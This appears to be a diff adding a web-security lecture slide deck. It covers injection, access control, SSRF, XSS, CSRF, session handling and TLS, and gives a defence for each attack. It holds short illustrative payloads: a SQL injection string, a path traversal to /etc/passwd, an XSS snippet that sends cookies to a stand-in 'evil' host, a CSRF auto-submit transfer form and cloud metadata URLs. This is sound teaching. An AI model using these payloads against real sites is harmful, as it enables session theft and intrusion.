@@ -1,0 +1,683 @@
+---
+index: 6
+title: Web Security
+topics:
+  - The Web Threat Model
+  - Server-Side Attacks
+  - Client-Side Attacks
+  - Sessions & Cookies
+  - TLS and HTTPS
+draft: false
+---
+
+<section>
+  <div class="toc"></div>
+</section>
+<section>
+  <div class="toc" data-selected="0"></div>
+</section>
+<section>
+  <section>
+    <h2>The Most Exposed Program You Will Write</h2>
+    <ul>
+      <li>
+        A web application is a program that runs
+        <strong class="hl-red">arbitrary input from strangers</strong>, all day,
+        with no gate in front of it
+      </li>
+      <li>Everything the client sends is under the client's control</li>
+      <ul>
+        <li>Path, query, headers, cookies, body — all of it</li>
+        <li>
+          Including fields <em>your own form</em> generated. The browser is
+          <span class="hl-orange">not</span> part of your system
+        </li>
+      </ul>
+      <li>
+        Client-side validation is a <em class="hl-cyan">usability</em> feature.
+        It is not a control, because the attacker does not use your form
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Two Different Victims</h2>
+    <ul>
+      <li>
+        <span class="hl-orange">Server-side attacks</span> target
+        <strong>your machine</strong> — the database, the file system, the
+        internal network
+      </li>
+      <li>
+        <span class="hl-cyan">Client-side attacks</span> target
+        <strong>your users</strong>, through the trust their browser places in
+        your origin
+      </li>
+      <li>
+        The second category is easy to under-weight, because nothing on your
+        server is damaged. Your users are still the ones who were robbed, and it
+        is still your bug
+      </li>
+      <li>
+        The browser's own defences — the
+        <span class="hl-green">same-origin policy</span> and CORS — protect the
+        <em>browser</em>, not your server
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>The Golden Rule</h2>
+    <div class="box">
+      <p>Never mix <em>data</em> with <em>code</em>.</p>
+    </div>
+    <ul>
+      <li>
+        Nearly every vulnerability in this lecture is one bug: data supplied by
+        a user is parsed as instructions by some interpreter
+      </li>
+      <ul>
+        <li>SQL injection — data becomes part of a query</li>
+        <li>XSS — data becomes part of an HTML document</li>
+        <li>Command injection — data becomes part of a shell command</li>
+      </ul>
+      <li>
+        Lecture 5 met the same bug in C: a name became a privilege flag because
+        nothing separated the two
+      </li>
+      <li>
+        The fix always has the same shape:
+        <strong class="hl-green">keep them apart</strong>. Not "sanitize harder"
+      </li>
+    </ul>
+  </section>
+</section>
+<section>
+  <div class="toc" data-selected="1"></div>
+</section>
+<section>
+  <section>
+    <h2>SQL Injection</h2>
+    <p>A login handler that builds its query by concatenation:</p>
+    <pre><code class="lang-go">
+query := "SELECT id FROM users WHERE name = '" + name + "'"
+    </code></pre>
+    <p>
+      What happens when <code class="hl-yellow">name</code> is
+      <code class="hl-red">' OR '1'='1</code>?
+    </p>
+  </section>
+  <section>
+    <h2>The Query the Database Sees</h2>
+    <pre><code class="lang-sql">
+SELECT id FROM users WHERE name = '' OR '1'='1'
+    </code></pre>
+    <ul>
+      <li>
+        The quote supplied by the user
+        <strong class="hl-red">ended the string</strong>, and everything after
+        it became SQL
+      </li>
+      <li>
+        The database behaved correctly. It cannot know which characters came
+        from you and which came from the attacker — by the time it sees the
+        query, that information is gone
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Prepared Statements</h2>
+    <pre><code class="lang-go">
+row := db.QueryRow("SELECT id FROM users WHERE name = $1", name)
+    </code></pre>
+    <ul>
+      <li>
+        The query goes to the server <em class="hl-green">once</em>, with holes
+        in it. The values travel <strong>separately</strong>
+      </li>
+      <li>
+        The value can never become SQL, whatever characters it contains, so
+        there is nothing left to escape
+      </li>
+      <li>
+        This is <span class="hl-cyan">protocol-level</span> separation, not
+        clever quoting. That distinction is the whole lesson
+      </li>
+      <li>
+        It also stops being your judgement call, which is why it holds up over
+        years of maintenance
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>The Same Bug, Other Interpreters</h2>
+    <ul>
+      <li>
+        <span class="hl-orange">Command injection</span> — input reaching
+        <code>sh -c</code>. Pass an argument <em>vector</em>, never a string
+      </li>
+      <li>
+        <span class="hl-orange">Path traversal</span> — a filename containing
+        <code class="hl-red">../../etc/passwd</code>. Resolve, then check the
+        result is still under the root
+      </li>
+      <li>
+        <span class="hl-orange">NoSQL injection</span> — a JSON body that
+        deserializes into a query object, e.g.
+        <code class="hl-yellow">{"password": {"$ne": null}}</code>
+      </li>
+      <li>
+        <span class="hl-orange">Template injection</span> — user input rendered
+        <em>as</em> a template, which usually means arbitrary code
+      </li>
+      <li>
+        <span class="hl-orange">Deserialization</span> — reconstructing objects
+        from untrusted bytes. Some formats can invoke code while parsing
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Broken Access Control</h2>
+    <p>
+      OWASP's number one since 2021, and it needs no injection at all — just a
+      changed number.
+    </p>
+    <pre><code class="lang-text">
+GET /api/invoices/1041     → your invoice
+GET /api/invoices/1042     → someone else's invoice
+    </code></pre>
+    <ul>
+      <li>
+        The session is valid, the user is authenticated. Nobody checked whether
+        <em>this</em> user owns <em>that</em> object
+      </li>
+      <li>
+        Hiding the link does nothing — the endpoint is still there. So does
+        using a UUID, which only makes it harder to guess
+      </li>
+      <li>
+        The check belongs <strong class="hl-green">in the query</strong>:
+        <code>WHERE id = $1 AND owner_id = $2</code>. Then forgetting it returns
+        nothing instead of returning someone's data
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Server-Side Request Forgery</h2>
+    <ul>
+      <li>
+        Your server fetches a URL the user supplied — a webhook, a thumbnail, a
+        PDF importer
+      </li>
+      <li>
+        The attacker points it <strong class="hl-red">inward</strong>, and your
+        server is already inside the firewall
+      </li>
+      <ul>
+        <li>
+          <code>http://169.254.169.254/</code> — the cloud metadata service, and
+          often the credentials with it
+        </li>
+        <li>
+          <code>http://localhost:6379/</code> — the admin port with no auth
+        </li>
+      </ul>
+      <li>
+        Defences: an <em class="hl-green">allow-list</em> of destinations,
+        resolve the name and check the address before connecting, and give the
+        fetcher its own network path with no route inside
+      </li>
+      <li>
+        Blocking on the string is not enough — DNS can resolve a public name to
+        a private address, and can answer differently the second time
+      </li>
+    </ul>
+  </section>
+</section>
+<section>
+  <div class="toc" data-selected="2"></div>
+</section>
+<section>
+  <section>
+    <h2>Cross-Site Scripting</h2>
+    <p>
+      The same bug, but the interpreter is the
+      <strong class="hl-cyan">browser</strong> and the injected code is
+      JavaScript.
+    </p>
+    <pre><code class="lang-javascript">
+// a comment box that renders whatever was posted
+element.innerHTML = "&lt;p&gt;" + comment + "&lt;/p&gt;";
+    </code></pre>
+    <p>
+      A comment of
+      <code class="hl-red"
+        >&lt;img src=x onerror="fetch('//evil/'+document.cookie)"&gt;</code
+      >
+      now runs in <em>every visitor's</em> session.
+    </p>
+  </section>
+  <section>
+    <h2>Three Kinds</h2>
+    <table style="font-size: 0.82em">
+      <tr>
+        <td class="hl-red"><strong>Stored</strong></td>
+        <td>
+          Saved on the server, served to everyone. The worst — it needs no lure
+        </td>
+      </tr>
+      <tr>
+        <td class="hl-orange"><strong>Reflected</strong></td>
+        <td>Echoed back from the request. Needs the victim to follow a link</td>
+      </tr>
+      <tr>
+        <td class="hl-yellow"><strong>DOM-based</strong></td>
+        <td>
+          Never reaches the server at all — client-side code reads the URL and
+          writes it into the page
+        </td>
+      </tr>
+    </table>
+    <ul>
+      <li>
+        Script running on your origin <em>is</em> your user: it can read the
+        page, submit forms, and reach any authenticated endpoint
+      </li>
+      <li>
+        Which is why XSS defeats CSRF tokens — the script simply reads the token
+        first
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Stopping It</h2>
+    <ul>
+      <li>
+        <span class="hl-green">Encode on output</span>, for the context you are
+        writing into. HTML body, attribute, JavaScript and URL each need
+        different escaping
+      </li>
+      <li>
+        <span class="hl-green">Use the API that cannot execute</span> —
+        <code>textContent</code>, never <code>innerHTML</code>. A modern
+        framework does this by default, and the danger is the escape hatch
+        (<code>dangerouslySetInnerHTML</code>, <code>v-html</code>)
+      </li>
+      <li>
+        <span class="hl-cyan">Content Security Policy</span> — tell the browser
+        which script sources are legitimate. A second layer, for when the first
+        one has a hole
+      </li>
+      <li>
+        <span class="hl-orange">Sanitize HTML with a library</span> if you must
+        accept it. Your regular expression will be bypassed
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Cross-Site Request Forgery</h2>
+    <ul>
+      <li>
+        The browser attaches your cookies to <strong>every</strong> request to a
+        site — including requests made by a
+        <em class="hl-red">different</em> site
+      </li>
+      <li>
+        So a page on <code>evil.example</code> can submit a form to your bank,
+        and the browser will authenticate it for the attacker
+      </li>
+    </ul>
+    <pre><code class="lang-html">
+&lt;form action="https://bank.example/transfer" method="POST"&gt;
+  &lt;input name="to"     value="attacker"&gt;
+  &lt;input name="amount" value="1000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+    </code></pre>
+    <p>
+      The attacker never sees the response. They do not need to — the transfer
+      already happened.
+    </p>
+  </section>
+  <section>
+    <h2>Stopping CSRF</h2>
+    <ul>
+      <li>
+        <span class="hl-green">SameSite cookies</span> — the browser will not
+        attach the cookie to a cross-site request. <code>Lax</code> is now the
+        default in current browsers, which killed most of this class outright
+      </li>
+      <li>
+        <span class="hl-cyan">CSRF token</span> — a per-session random value in
+        the form, checked on the server. The attacker's page cannot read it,
+        because the same-origin policy stops them
+      </li>
+      <li>
+        <span class="hl-orange">Re-authenticate</span> for operations that
+        really matter
+      </li>
+      <li>
+        And the precondition for all of it: a
+        <strong class="hl-red">GET must never change state</strong>. If it does,
+        an <code>&lt;img&gt;</code> tag is an attack
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>The Rest of the Client Side</h2>
+    <ul>
+      <li>
+        <span class="hl-orange">Clickjacking</span> — your page in an invisible
+        iframe over the attacker's buttons. Fix: <code>frame-ancestors</code> in
+        CSP
+      </li>
+      <li>
+        <span class="hl-orange">Open redirect</span> — <code>?next=</code>
+        pointing anywhere. Turns your domain into a credible phishing link.
+        Allow-list the destinations
+      </li>
+      <li>
+        <span class="hl-orange">Supply chain</span> — a script tag pointing at
+        someone else's CDN is that party executing code on your origin, forever.
+        Pin it with Subresource Integrity, or host it yourself
+      </li>
+      <li>
+        <span class="hl-orange">Dependencies</span> — the average application is
+        mostly other people's code. Lock the versions, scan them, and update
+        deliberately
+      </li>
+    </ul>
+  </section>
+</section>
+<section>
+  <div class="toc" data-selected="3"></div>
+</section>
+<section>
+  <section>
+    <h2>HTTP Has No Memory</h2>
+    <ul>
+      <li>
+        Every request stands alone. The protocol has no idea the last one came
+        from the same person
+      </li>
+      <li>
+        So we check the password <strong class="hl-green">once</strong>, and
+        hand out a <span class="hl-orange">session identifier</span> the browser
+        returns automatically
+      </li>
+      <li>
+        Which makes that identifier
+        <em class="hl-red">as good as the password</em>, for as long as it lives
+      </li>
+      <li>Everything below follows from that one sentence</li>
+    </ul>
+  </section>
+  <section class="hands-on">
+    <h2>Guessing the Session</h2>
+    <pre><code class="lang-sh">
+### three logins against a hand-rolled generator ###
+Set-Cookie: session=sess-1; Path=/
+Set-Cookie: session=sess-2; Path=/
+Set-Cookie: session=sess-3; Path=/
+
+### three logins against crypto/rand ###
+Set-Cookie: session=o2d9gnBGHyvvd0vFCQYvVA; Path=/; HttpOnly; Secure; SameSite=Lax
+Set-Cookie: session=YDmu9RDLwkgzBI8l3LxmWA; Path=/; HttpOnly; Secure; SameSite=Lax
+Set-Cookie: session=1nEDix88iEUq4gQ16crT6A; Path=/; HttpOnly; Secure; SameSite=Lax
+    </code></pre>
+    <ul>
+      <li>
+        Log in once as yourself, get <code>sess-4</code>, and now try
+        <code>sess-3</code>
+      </li>
+      <li>
+        A session identifier needs
+        <strong class="hl-green">128 bits from a CSPRNG</strong>. Not a counter,
+        not a timestamp, not a hash of the username
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>The Cookie Attributes</h2>
+    <table style="font-size: 0.82em">
+      <tr>
+        <td class="hl-orange"><strong>HttpOnly</strong></td>
+        <td>JavaScript cannot read it, so an XSS bug cannot simply steal it</td>
+      </tr>
+      <tr>
+        <td class="hl-green"><strong>Secure</strong></td>
+        <td>Sent over HTTPS only — never in the clear, not even once</td>
+      </tr>
+      <tr>
+        <td class="hl-cyan"><strong>SameSite</strong></td>
+        <td>Not attached to cross-site requests. The CSRF defence</td>
+      </tr>
+      <tr>
+        <td class="hl-violet"><strong>Path / Domain</strong></td>
+        <td>Narrow the scope. Do not widen it to the parent domain casually</td>
+      </tr>
+      <tr>
+        <td class="hl-yellow"><strong>__Host- prefix</strong></td>
+        <td>
+          The browser enforces Secure, no Domain, and Path=/ — a subdomain
+          cannot overwrite it
+        </td>
+      </tr>
+    </table>
+    <p>
+      <code>HttpOnly</code> blocks <em>script access</em>. It does nothing about
+      the network — that is what <code>Secure</code> is for.
+    </p>
+  </section>
+  <section>
+    <h2>Attacks on Sessions</h2>
+    <ul>
+      <li>
+        <span class="hl-red">Hijacking</span> — steal the identifier by
+        sniffing, by XSS, or from a log file that recorded the URL
+      </li>
+      <li>
+        <span class="hl-orange">Fixation</span> — the attacker plants a session
+        identifier <em>before</em> you log in and waits for you to authenticate
+        it
+      </li>
+      <ul>
+        <li>
+          Fix in one line:
+          <strong class="hl-green">issue a new identifier at login</strong>, and
+          again at any privilege change
+        </li>
+      </ul>
+      <li>
+        <span class="hl-yellow">Never in the URL.</span> URLs end up in browser
+        history, server logs, and the <code>Referer</code> header sent to other
+        sites
+      </li>
+      <li>
+        <span class="hl-cyan">Expire them</span> — idle timeout and an absolute
+        lifetime, both
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Logging Out Is a Server-Side Delete</h2>
+    <ul>
+      <li>
+        Clearing the cookie asks the <em>browser</em> to forget. It does nothing
+        to a copy the attacker already has
+      </li>
+      <li>
+        Log out by
+        <strong class="hl-green">deleting the session from the store</strong>.
+        Then the stolen identifier refers to nothing
+      </li>
+      <li>
+        This is the strongest argument for server-side sessions over
+        self-contained tokens
+      </li>
+      <ul>
+        <li>
+          A signed <span class="hl-orange">JWT</span> is valid until it expires,
+          because nothing is consulted to check it
+        </li>
+        <li>
+          Revoking one means keeping a deny-list — which is a session store,
+          rebuilt reluctantly
+        </li>
+      </ul>
+      <li>
+        And a JWT is <em class="hl-red">signed, not encrypted</em>. The payload
+        is readable base64url; do not put secrets in it
+      </li>
+    </ul>
+  </section>
+</section>
+<section>
+  <div class="toc" data-selected="4"></div>
+</section>
+<section>
+  <section>
+    <h2>What TLS Actually Gives You</h2>
+    <ul>
+      <li>
+        <span class="hl-orange">Confidentiality</span> — the network cannot read
+        it
+      </li>
+      <li>
+        <span class="hl-green">Integrity</span> — the network cannot change it
+        undetected
+      </li>
+      <li>
+        <span class="hl-cyan">Server authentication</span> — you are talking to
+        the name in the URL
+      </li>
+    </ul>
+    <p>Note what is not on the list:</p>
+    <ul>
+      <li>
+        It says nothing about whether the <em>server</em> is trustworthy or its
+        code is correct. A phishing site can have a perfect certificate
+      </li>
+      <li>
+        Client authentication is optional and rarely used on the public web
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>The Handshake, Briefly</h2>
+    <ul>
+      <li>
+        <span class="hl-orange">ClientHello</span> — versions, cipher suites,
+        and a key share. Sent before any key exists, so it is
+        <strong>in the clear</strong>
+      </li>
+      <li>
+        <span class="hl-green">ServerHello</span> — the chosen suite and the
+        server's key share
+      </li>
+      <li>
+        <span class="hl-cyan">Certificate + signature</span> — the server proves
+        it holds the private key for the name it claims
+      </li>
+      <li>
+        Both sides derive the same session keys from the two shares — that is
+        Diffie–Hellman from lecture 3, and it is why recording the traffic does
+        not help later
+      </li>
+      <li>
+        <span class="hl-violet">TLS 1.3</span> does this in one round trip,
+        removed every legacy cipher, and made forward secrecy mandatory
+      </li>
+    </ul>
+  </section>
+  <section class="hands-on">
+    <h2>A Certificate the Client Will Not Accept</h2>
+    <pre><code class="lang-sh">
+$ openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem \
+      -out cert.pem -days 1 -subj "/CN=lecture.local"
+
+$ openssl x509 -in cert.pem -noout -subject -issuer
+  subject=CN=lecture.local
+  issuer=CN=lecture.local        &lt;-- it signed itself
+
+$ openssl s_client -connect 127.0.0.1:8443 -verify_return_error
+verify error:num=18:self-signed certificate
+Verification error: self-signed certificate
+    </code></pre>
+    <p>
+      The cryptography is perfect. The <em class="hl-orange">trust</em> is
+      missing — nothing vouches for the name.
+    </p>
+  </section>
+  <section class="hands-on">
+    <h2>The Same Handshake, Checking Turned Off</h2>
+    <pre><code class="lang-text">
+New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
+Protocol: TLSv1.3
+Server public key is 2048 bit
+Peer signature type: rsa_pss_rsae_sha256
+Verification error: self-signed certificate
+    </code></pre>
+    <ul>
+      <li>
+        TLS 1.3, AES-256-GCM, RSA-PSS — every primitive from lecture 3, doing
+        exactly its job
+      </li>
+      <li>
+        And the connection is worthless, because
+        <strong class="hl-red"
+          >an encrypted channel to an unverified party is a channel to the
+          attacker</strong
+        >
+      </li>
+      <li>
+        This is why <code>InsecureSkipVerify</code> and <code>curl -k</code> in
+        production code are a finding, not a convenience
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Getting HTTPS Right</h2>
+    <ul>
+      <li>
+        <span class="hl-green">HTTPS everywhere</span>, and redirect HTTP to it
+        — but the redirect itself travels in the clear
+      </li>
+      <li>
+        <span class="hl-cyan">HSTS</span> closes that gap: the browser remembers
+        to use HTTPS and refuses to be talked down. Preloading removes even the
+        first visit
+      </li>
+      <li>
+        <span class="hl-orange">No mixed content.</span> One
+        <code>http://</code> script on an HTTPS page hands the whole page back
+        to the network
+      </li>
+      <li>
+        <span class="hl-violet">Automate renewal.</span> Certificates now last
+        weeks, not years, and an expired certificate is an outage
+      </li>
+      <li>
+        Modern configuration: TLS 1.2 and 1.3 only, and let the library choose
+      </li>
+    </ul>
+  </section>
+  <section>
+    <h2>Where This Leaves Us</h2>
+    <ul>
+      <li>
+        Every server-side bug here was <em>data becoming code</em>. Every
+        client-side one was <em>trust in an origin being misused</em>
+      </li>
+      <li>
+        Sessions are the credential after login, and deserve the care the
+        password gets
+      </li>
+      <li>TLS protects the channel. It has never protected the endpoints</li>
+    </ul>
+    <div class="box">
+      <p>
+        Next: the layer underneath — what the network itself can be made to do,
+        and how zoning, firewalls and VPNs draw the boundaries.
+      </p>
+    </div>
+  </section>
+</section>
